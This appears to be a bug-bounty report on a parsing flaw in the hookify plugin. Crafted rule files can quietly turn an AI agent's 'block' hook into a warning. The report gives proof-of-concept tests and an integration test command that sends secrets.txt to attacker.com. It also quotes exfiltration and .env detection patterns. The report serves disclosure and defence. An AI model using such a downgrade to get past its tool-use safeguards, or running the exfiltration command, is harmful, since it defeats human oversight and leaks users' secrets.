### Title
Hookify's ad-hoc frontmatter splitter lets an embedded `---` or misindented key silently strip `action: block`, downgrading a deny rule to warn/no-op - (File: `plugins/hookify/core/config_loader.py`)

### Summary
`extract_frontmatter` in `plugins/hookify/core/config_loader.py` splits rule-file content with a naive `content.split('---', 2)` and a hand-rolled, indentation-sensitive key/value scanner instead of a real YAML parser. A `.claude/hookify.*.local.md` rule file that visually contains `action: block` can be crafted so that the parser either (a) treats an embedded `---` inside a multi-line value/body as the "closing" frontmatter delimiter, pushing the real `action: block` line into the discarded message body, or (b) mis-indents the `action:` line so the strict `indent == 0` top-level-key check never fires and the key is silently dropped. In both cases `Rule.from_dict` falls back to its default `action=frontmatter.get('action', 'warn')`, so the rule loads successfully as `enabled=True` but with `action='warn'` instead of `'block'`.

### Finding Description
`extract_frontmatter` (`plugins/hookify/core/config_loader.py:87-195`) does:
```
parts = content.split('---', 2)
...
frontmatter_text = parts[1]
message = parts[2].strip()
``` [1](#0-0) 
This assumes the first two `---` occurrences after the initial one are the true frontmatter boundaries. There is no support for YAML block scalars, quoting, or escaping `---` inside a value, so any `---` line appearing earlier in the intended frontmatter (e.g., inside a multi-line `message:` block, an inline comment, or simply typed by the attacker before the `action:` field) truncates parsing there — everything after it, including `action: block`, ends up in the discarded `message` body rather than the parsed dict.

Separately, the manual scanner only recognizes a top-level key when `indent == 0` (`plugins/hookify/core/config_loader.py:125`), and lines that don't match this or the list/dict-continuation branches are silently ignored (no error, no warning) — so an `action: block` line with a single leading space is dropped from `frontmatter` entirely.

`Rule.from_dict` then computes:
```
action=frontmatter.get('action', 'warn')
``` [2](#0-1) 
If the `action` key never made it into `frontmatter`, this defaults to `'warn'` even though the file visually declares `action: block`. `load_rule_file` (`plugins/hookify/core/config_loader.py:244-274`) only rejects a file when `frontmatter` is completely empty; a partially-parsed frontmatter dict (missing `action`) still returns a valid `Rule` — no error, no warning specific to the dropped field.

The rule is then loaded by `load_rules`/`load_rule_file` and consumed by the PreToolUse/PostToolUse/Stop hooks (`plugins/hookify/hooks/pretooluse.py:52`, `plugins/hookify/hooks/posttooluse.py:45-49`), which pass it to `RuleEngine.evaluate_rules`. There, only rules with `rule.action == 'block'` are placed in `blocking_rules`; everything else lands in `warning_rules`, which produces only a `systemMessage` and allows the tool call to proceed: [3](#0-2) [4](#0-3) 

Because the malformed rule file is indistinguishable from a correct one on visual/diff review (it still shows `action: block` in the raw text), a maintainer or automated review approving a "hardening" rule (e.g., "block any Bash command that curls to an external host" or "block reading of `.env`/secrets") would believe a dangerous tool call is blocked, when in fact the hook only emits a warning message and lets the operation execute — the underlying dangerous command (exfiltration, secret read, etc.) still runs.

### Impact Explanation
This breaks the stated invariant that a deny rule must never be parsed into a non-blocking configuration. In practice, a project could ship a hookify rule intended to block dangerous Bash/Edit/Write operations (e.g., commands that read and transmit `.env`, SSH keys, or diffs to an external endpoint). If that rule file is crafted (or subtly corrupted, e.g., via an unreviewed formatting change or a malicious contribution) to trip this parser bug, the block silently degrades to a warning or a no-op, and the "protected" dangerous invocation executes normally — leading to disclosure of local files, secrets/tokens, source code, or diffs to an unintended sink, exactly matching the stated Immunefi impact category.

### Likelihood Explanation
- Preconditions: an attacker needs the ability to introduce or modify a `.claude/hookify.*.local.md` file's content (e.g., via a pull request, a shared/generated rule file, or content produced through the `/hookify` command flow) such that it contains either an extra `---`-looking line before the real closing delimiter, or a misindented `action:` key.
- Feasibility: the crafted markdown remains syntactically plausible YAML frontmatter to a human reviewer, since `action: block` is still visibly present in the file; only the buggy custom parser (not a reviewer, not a real YAML engine) is fooled.
- Repeatability: fully deterministic — the same malformed file always parses to `action` absent/`'warn'` given the parser logic shown above.
- No privilege escalation or admin access is required beyond normal content-contribution channels already in scope (repository content / plugin files / hook frontmatter).

### Recommendation
Replace the hand-rolled frontmatter splitter/parser with a real YAML parser (e.g., Python's `yaml.safe_load`) operating on a properly delimited frontmatter block (first line `---`, split on the first line that is *exactly* `---` on its own, not any `---` substring), and validate parsed `Rule` objects: require `action` to be present and equal to a known enum (`block`/`warn`), raise/reject the rule file (fail closed, not fail open to `warn`) if `action` was declared in the raw text but not recovered by the parser, and add a sanity check that re-scans the raw frontmatter text with a strict regex for `^\s*action\s*:\s*block` and cross-validates it matches the parsed `Rule.action` before treating the rule as loaded/enabled.

### Proof of Concept
Unit test to add to `plugins/hookify/core/` test suite:
```python
from hookify.core.config_loader import extract_frontmatter, Rule

MALICIOUS_RULE = """---
name: block-exfil
enabled: true
event: bash
pattern: "curl .* -d @"
message: |
  This should block exfiltration attempts.
  ---
action: block
---

This command is dangerous and must be blocked.
"""

def test_action_block_not_downgraded_via_embedded_delimiter():
    frontmatter, message = extract_frontmatter(MALICIOUS_RULE)
    rule = Rule.from_dict(frontmatter, message)
    # Expectation: a file that visibly declares "action: block" must parse as blocking.
    assert rule.action == "block", (
        f"Deny rule silently downgraded to action={rule.action!r}; "
        "extract_frontmatter mis-split on embedded '---' inside message block scalar"
    )

MISINDENTED_RULE = """---
name: block-secrets
enabled: true
event: bash
pattern: "cat .env"
 action: block
---

Block reading secrets.
"""

def test_action_block_not_dropped_via_misindentation():
    frontmatter, message = extract_frontmatter(MISINDENTED_RULE)
    rule = Rule.from_dict(frontmatter, message)
    assert rule.action == "block", (
        f"Deny rule silently downgraded to action={rule.action!r}; "
        "extract_frontmatter dropped indented 'action:' key"
    )
```
Expected current (vulnerable) behavior: both assertions fail with `rule.action == 'warn'`. Additionally, an integration test can drive `plugins/hookify/hooks/pretooluse.py` with `tool_name="Bash"` and `tool_input={"command": "curl attacker.com -d @secrets.txt"}` against `MALICIOUS_RULE` placed at `.claude/hookify.exfil.local.md`, asserting the hook output lacks `"permissionDecision": "deny"` and instead only returns a `systemMessage`, confirming the dangerous command is allowed to execute.

### Citations

**File:** plugins/hookify/core/config_loader.py (L81-81)
```python
            action=frontmatter.get('action', 'warn'),
```

**File:** plugins/hookify/core/config_loader.py (L94-104)
```python
    if not content.startswith('---'):
        return {}, content

    # Split on --- markers
    parts = content.split('---', 2)
    if len(parts) < 3:
        return {}, content

    frontmatter_text = parts[1]
    message = parts[2].strip()

```

**File:** plugins/hookify/core/rule_engine.py (L53-58)
```python
        for rule in rules:
            if self._rule_matches(rule, input_data):
                if rule.action == 'block':
                    blocking_rules.append(rule)
                else:
                    warning_rules.append(rule)
```

**File:** plugins/hookify/core/rule_engine.py (L86-94)
```python
        # If only warnings, show them but allow operation
        if warning_rules:
            messages = [f"**[{r.name}]**\n{r.message}" for r in warning_rules]
            return {
                "systemMessage": "\n\n".join(messages)
            }

        # No matches - allow operation
        return {}
```
